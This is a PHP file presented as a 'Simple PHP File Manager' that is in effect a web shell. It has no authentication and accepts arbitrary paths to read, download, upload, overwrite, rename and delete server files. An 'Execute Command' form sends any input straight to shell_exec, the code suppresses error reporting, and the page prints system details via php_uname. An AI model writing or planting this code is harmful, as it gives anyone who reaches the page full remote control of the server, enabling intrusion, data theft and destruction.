<?php
error_reporting(0);

function listFiles($path)
{
    $files = scandir($path);
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') {
            continue;
        }
        echo '<li><a href="?path=' . $path . '/' . $file . '">' . $file . '</a></li>';
    }
}

$path = isset($_GET['path']) ? $_GET['path'] : __DIR__;

if (isset($_POST['upload'])) {
    $targetDir = $path;
    $targetFile = $targetDir . '/' . basename($_FILES['file']['name']);

    if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
        echo 'File uploaded successfully.';
    } else {
        echo 'Error uploading file.';
    }
}

if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        readfile($file);
        exit;
    } else {
        echo 'File not found.';
    }
}

if (isset($_POST['edit'])) {
    $editedContent = $_POST['content'];
    $editFile = $_POST['path'];

    if (file_put_contents($editFile, $editedContent) !== false) {
        echo 'File edited successfully.';
    } else {
        echo 'Error editing file.';
    }
}

if (isset($_POST['delete'])) {
    $fileToDelete = $_POST['path'];

    if (is_file($fileToDelete) && unlink($fileToDelete)) {
        echo 'File deleted successfully.';
    } elseif (is_dir($fileToDelete) && rmdir($fileToDelete)) {
        echo 'Directory deleted successfully.';
    } else {
        echo 'Error deleting file or directory.';
    }
}

if (isset($_POST['rename'])) {
    $newName = $_POST['new_name'];
    $fileToRename = $_POST['path'];

    if (rename($fileToRename, dirname($fileToRename) . '/' . $newName)) {
        echo 'File or directory renamed successfully.';
    } else {
        echo 'Error renaming file or directory.';
    }
}

if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    echo '<pre>';
    if (!empty($cmd)) {
        echo shell_exec($cmd . ' 2>&1');
    }
    echo '</pre>';
}

echo "<br>" . php_uname() . "<br>";
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP File Manager</title>
</head>
<body>

<h2>Simple PHP File Manager</h2>

<form action="" method="post" enctype="multipart/form-data">
    <label for="file">Upload File:</label>
    <input type="file" name="file" id="file">
    <input type="submit" name="upload" value="Upload">
</form>

<?php if (isset($_GET['path']) && is_file($_GET['path'])): ?>
    <?php
    $filePath = $_GET['path'];
    $fileContent = file_get_contents($filePath);
    ?>
    <h3>Edit File: <?php echo $filePath; ?></h3>
    <form action="" method="post">
        <textarea name="content" rows="10" cols="50"><?php echo htmlspecialchars($fileContent); ?></textarea><br>
        <input type="hidden" name="path" value="<?php echo $filePath; ?>">
        <input type="submit" name="edit" value="Save Changes">
    </form>
<?php endif; ?>

<h3>Current Directory: <a href="?path=<?php echo urlencode(dirname($path)); ?>"><?php echo $path; ?></a></h3>

<ul>
    <?php listFiles($path); ?>
</ul>

<?php if ($path != __DIR__ && isset($_GET['path'])): ?>
    <form action="" method="post">
        <input type="hidden" name="path" value="<?php echo $path; ?>">
        <input type="submit" name="delete" value="Delete Directory">
        <input type="text" name="new_name" placeholder="New Directory Name">
        <input type="submit" name="rename" value="Rename Directory">
    </form>
    <p><a href="?path=<?php echo urlencode(dirname($path)); ?>">Go Up</a></p>
<?php endif; ?>

<?php if (isset($_GET['path']) && is_file($_GET['path'])): ?>
    <form action="" method="post">
        <input type="hidden" name="path" value="<?php echo $path; ?>">
        <input type="submit" name="delete" value="Delete File">
        <input type="text" name="new_name" placeholder="New File Name">
        <input type="submit" name="rename" value="Rename File">
    </form>
    <p><a href="?download=<?= urlencode($_GET['path']) ?>">Download File</a></p>
<?php endif; ?>

<form method="post">
    <label for="cmd">Execute Command:</label>
    <input type="text" name="cmd" id="cmd">
    <input type="submit" value="Execute">
</form>

</body>
</html>
